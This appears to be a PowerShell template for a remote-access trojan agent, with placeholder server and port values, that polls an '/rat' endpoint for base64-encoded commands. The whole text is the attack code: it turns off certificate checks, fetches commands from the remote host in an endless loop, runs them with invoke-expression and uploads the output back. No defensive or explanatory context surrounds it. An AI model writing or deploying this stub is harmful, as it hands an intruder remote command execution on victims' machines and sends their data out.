$resp = "http://{SERVER}:{PORT}/rat"
$w = New-Object Net.WebClient
while($true)
{{
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
$r_get = $w.DownloadString($resp)
$d = [System.Convert]::FromBase64String($r_get);
$Ds = [System.Text.Encoding]::UTF8.GetString($d);
while($r_get) {{
    $output = invoke-expression $Ds | out-string
    $w.UploadString($resp, $output)
    break
}}
}}